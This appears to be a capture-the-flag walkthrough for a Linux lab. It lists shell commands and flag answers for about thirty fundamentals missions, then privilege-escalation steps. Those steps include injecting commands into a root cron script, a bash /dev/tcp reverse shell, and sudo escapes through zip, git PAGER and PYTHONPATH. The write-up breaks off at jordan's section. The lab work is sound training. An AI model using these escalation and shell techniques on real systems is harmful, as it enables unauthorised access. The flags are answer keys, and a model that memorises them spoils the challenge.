# Linux Agency x

## Task 3 Linux Fundamentals

#### What is the mission1 flag?

```
ssh agent47@10.10.32.8
```

{% hint style="success" %}
`mission1{174dc8f191bcbb161fe25f8a5b58d1f0}`
{% endhint %}

#### What is the mission2 flag?

```
ls -l
```

{% hint style="success" %}
`mission2{8a1b68bb11e4a35245061656b5b9fa0d}`
{% endhint %}

#### What is the mission3 flag?

```
cat flag.txt
```

{% hint style="success" %}
`mission3{ab1e1ae5cba688340825103f70b0f976}`
{% endhint %}

#### What is the mission4 flag?

```bash
xxd flag.txt
```

{% hint style="success" %}
`mission4{264a7eeb920f80b3ee9665fafb7ff92d}`
{% endhint %}

#### What is the mission5 flag?

```
cat flag/flag.txt
```

{% hint style="success" %}
`mission5{bc67906710c3a376bcc7bd25978f62c0}`
{% endhint %}

#### What is the mission6 flag?

```bash
cat .flag.txt 
```

{% hint style="success" %}
`mission6{1fa67e1adc244b5c6ea711f0c9675fde}`
{% endhint %}

#### What is the mission7 flag?

```bash
cat .flag/flag.txt
```

{% hint style="success" %}
`mission7{53fd6b2bad6e85519c7403267225def5}`
{% endhint %}

#### What is the mission8 flag?

```bash
find / -type f -name flag.txt 2>/dev/null
# /home/mission7/flag.txt
cat /home/mission7/flag.txt
```

{% hint style="success" %}
`mission8{3bee25ebda7fe7dc0a9d2f481d10577b}`
{% endhint %}

#### What is the mission9 flag?

```bash
find / -type f -name flag.txt 2>/dev/null
# /flag.txt
cat /flag.txt 
```

{% hint style="success" %}
`mission9{ba1069363d182e1c114bef7521c898f5}`
{% endhint %}

#### What is the mission10 flag?

```bash
egrep '^mission10{[^}]*}' rockyou.txt
```

{% hint style="success" %}
`mission10{0c9d1c7c5683a1a29b05bb67856524b6}`
{% endhint %}

#### What is the mission11 flag?

```bash
grep -rh mission11 folder/
```

{% hint style="success" %}
`mission11{db074d9b68f06246944b991d433180c0}`
{% endhint %}

#### What is the mission12 flag?

```bash
sed -n 98,99p .bashrc 
# export FLAG=$(echo fTAyN2E5Zjc2OTUzNjQ1MzcyM2NkZTZkMzNkMWE5NDRmezIxbm9pc3NpbQo= |base64 -d|rev)
# export flag=$(echo fTAyN2E5Zjc2OTUzNjQ1MzcyM2NkZTZkMzNkMWE5NDRmezIxbm9pc3NpbQo= |base64 -d|rev)
echo $flag
```

{% hint style="success" %}
`mission12{f449a1d33d6edc327354635967f9a720}`
{% endhint %}

#### What is the mission13 flag?

```bash
chmod 400 flag.txt
cat flag.txt
```

{% hint style="success" %}
`mission13{076124e360406b4c98ecefddd13ddb1f}`
{% endhint %}

#### What is the mission14 flag?

```bash
cat flag.txt | base64 -d
```

{% hint style="success" %}
`mission14{d598de95639514b9941507617b9e54d2}`
{% endhint %}

#### What is the mission15 flag?

{% tabs %}
{% tab title="Python" %}
```python
>>> b = int(open("flag.txt", "r").read(), 2)
>>> b_len = (b.bit_length() + 7) // 8
>>> b.to_bytes(b_len, "big").decode()
```
{% endtab %}

{% tab title="Perl" %}
```bash
cat flag.txt  | perl -lpe '$_=pack"B*",$_'
```
{% endtab %}

{% tab title="sed" %}
```bash
sed 's/$/P/g;s/^/2i/' flag.txt | dc;echo
```
{% endtab %}
{% endtabs %}

{% hint style="success" %}
`mission15{fc4915d818bfaeff01185c3547f25596}`
{% endhint %}

#### Reference

{% embed url="https://unix.stackexchange.com/questions/98948/ascii-to-binary-and-binary-to-ascii-conversion-tools" %}

{% embed url="https://www.kite.com/python/answers/how-to-convert-binary-string-to-and-from-ascii-text-in-python" %}

#### What is the mission16 flag?

```bash
cat flag.txt | xxd -r -p
```

{% hint style="success" %}
`mission16{884417d40033c4c2091b44d7c26a908e}`
{% endhint %}

#### What is the mission17 flag? <a href="#what-is-the-mission16-flag" id="what-is-the-mission16-flag"></a>

```bash
file flag
# ELF 64-bit LSB shared object
chmod +x flag 
./flag 
```

{% hint style="success" %}
`mission17{49f8d1348a1053e221dfe7ff99f5cbf4}`
{% endhint %}

#### What is the mission18 flag?

```bash
javac flag.java
java flag
```

{% hint style="success" %}
`mission18{f09760649986b489cda320ab5f7917e8}`
{% endhint %}

#### What is the mission19 flag?

```bash
ruby flag.rb 
```

{% hint style="success" %}
`mission19{a0bf41f56b3ac622d808f7a4385254b7}`
{% endhint %}

#### What is the mission20 flag?

```bash
gcc flag.c
./a.out
```

{% hint style="success" %}
`mission20{b0482f9e90c8ad2421bf4353cd8eae1c}`
{% endhint %}

#### What is the mission21 flag?

```bash
python flag.py 
```

{% hint style="success" %}
`mission21{7de756aabc528b446f6eb38419318f0c}`
{% endhint %}

#### What is the mission22 flag?

```bash
bash
```

{% hint style="success" %}
`mission22{24caa74eb0889ed6a2e6984b42d49aaf}`
{% endhint %}

#### What is the mission23 flag?

```bash
>>> import subprocess
>>> subprocess.Popen(["cat", "flag.txt"])
```

{% hint style="success" %}
`mission23{3710b9cb185282e3f61d2fd8b1b4ffea}`
{% endhint %}

#### What is the mission24 flag?

```bash
cat message.txt 
# The hosts will help you.
# [OPTIONAL] Maybe you will need curly hairs.
cat /etc/hosts
# 127.0.0.1	localhost	linuxagency	mission24.com
curl -s mission24.com | egrep -o 'mission24{[^}]*}'
```

{% hint style="success" %}
`mission24{dbaeb06591a7fd6230407df3a947b89c}`
{% endhint %}

#### What is the mission25 flag?

```bash
./bribe 
# There is a guy who is smuggling flags
# Bribe this guy to get the flag
# Put some money in his pocket to get the flag
# Words are not the price for your flag
# Give Me money Man!!!
scp bribe kali@10.17.20.154:/tmp/
# Examine with Ghidra
pocket=money ./bribe
```

{% hint style="success" %}
`mission25{61b93637881c87c71f220033b22a921b}`
{% endhint %}

#### What is the mission26 flag?

```bash
/bin/cat flag.txt
```

{% hint style="success" %}
`mission26{cb6ce977c16c57f509e9f8462a120f00}`
{% endhint %}

#### What is the mission27 flag?

```bash
file flag.jpg | egrep -o 'mission27{[^}]*}'
```

{% hint style="success" %}
`mission27{444d29b932124a48e7dddc0595788f4d}`
{% endhint %}

#### What is the mission28 flag?

```bash
file flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
# gzip compressed data
gunzip flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz

file flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png
# GIF image data
strings flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png 
```

{% hint style="success" %}
`mission28{03556f8ca983ef4dc26d2055aef9770f}`
{% endhint %}

#### What is the mission29 flag?

```bash
irb> system("ls")
# examples.desktop  txt.galf
irb> system("cat txt.galf | rev")
```

{% hint style="success" %}
`mission29{8192b05d8b12632586e25be74da2fff1}`
{% endhint %}

#### What is the mission30 flag?

```bash
egrep -rh 'mission30{[^}]*}' bludit/
```

{% hint style="success" %}
`mission30{d25b4c9fac38411d2fcb4796171bda6e}`
{% endhint %}

#### What is viktor's flag?

```bash
cd Escalator/
git log | egrep -o 'viktor{[^}]*}'
```

{% hint style="success" %}
`viktor{b52c60124c0f8f85fe647021122b3d9a}`
{% endhint %}

## Task 4 Privilege Escalation

#### What is dalia's flag?

```bash
cat /etc/crontab
# *  *	* * *	dalia	sleep 30;/opt/scripts/47.sh
# *  *	* * *	root	echo "IyEvYmluL2Jhc2gKI2VjaG8gIkhlbGxvIDQ3IgpybSAtcmYgL2Rldi9zaG0vCiNlY2hvICJIZXJlIHRpbWUgaXMgYSBncmVhdCBtYXR0ZXIgb2YgZXNzZW5jZSIKcm0gLXJmIC90bXAvCg==" | base64 -d > /opt/scripts/47.sh;chown viktor:viktor /opt/scripts/47.sh;chmod +x /opt/scripts/47.sh;
for i in {1..1000}; do echo 'cat /home/dalia/* > /tmp/dalia.txt' >> /opt/scripts/47.sh; sleep 1; done
```

```bash
cat /tmp/dalia.txt | egrep 'dalia{[^}]*}'
```

{% hint style="success" %}
`dalia{4a94a7a7bb4a819a63a33979926c77dc}`
{% endhint %}

#### What is silvio's flag?

```
for i in {1..1000}; do echo 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' >> /opt/scripts/47.sh; sleep 1; done
```

```bash
nc -nvlp 4444
python3 -c 'import pty; pty.spawn("/bin/bash")'
sudo -l
# User dalia may run the following commands on linuxagency:
#     (silvio) NOPASSWD: /usr/bin/zip
```

```
TF=$(mktemp -u); sudo -u silvio /usr/bin/zip $TF /etc/hosts -T -TT 'bash #'
cd; cat flag.txt
```

{% hint style="danger" %}
`silvio{657b4d058c03ab9988875bc937f9c2ef}`
{% endhint %}

#### What is reza's flag?

```bash
sudo -l
# User silvio may run the following commands on linuxagency:
#     (reza) SETENV: NOPASSWD: /usr/bin/git
sudo -u reza PAGER='sh -c "exec bash 0<&1"' git -p help
cd; cat flag.txt
```

{% hint style="success" %}
`reza{2f1901644eda75306f3142d837b80d3e}`
{% endhint %}

#### What is jordan's flag?

```bash
sudo -l 
# User reza may run the following commands on linuxagency:
#     (jordan) SETENV: NOPASSWD: /opt/scripts/Gun-Shop.py
touch /tmp/shop.py; sudo -u jordan PYTHONPATH=/tmp /opt/scripts/Gun-Shop.py
```

{% hint style="danger" %}

{% endhint %}















